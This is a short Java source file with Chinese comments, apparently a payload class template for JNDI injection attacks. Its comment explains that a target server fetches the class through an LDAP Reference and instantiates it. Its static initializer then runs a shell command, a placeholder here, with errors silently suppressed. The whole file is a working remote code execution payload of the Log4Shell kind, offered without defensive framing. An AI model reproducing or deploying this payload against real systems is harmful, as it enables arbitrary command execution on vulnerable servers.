import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

/**
 * JNDI 反连链模板：LDAP Reference 指向该类，目标从内置 HTTP 端口下载后实例化，
 * 类初始化（static 块）执行命令。必须实现 ObjectFactory 才能被 JNDI NamingManager 接受。
 */
public class ExecShell implements ObjectFactory {
    static {
        try {
            Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "CMD_PLACEHOLDER"});
        } catch (Exception e) {
            // 静默失败
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx,
                                    Hashtable<?, ?> environment) {
        return null;
    }
}
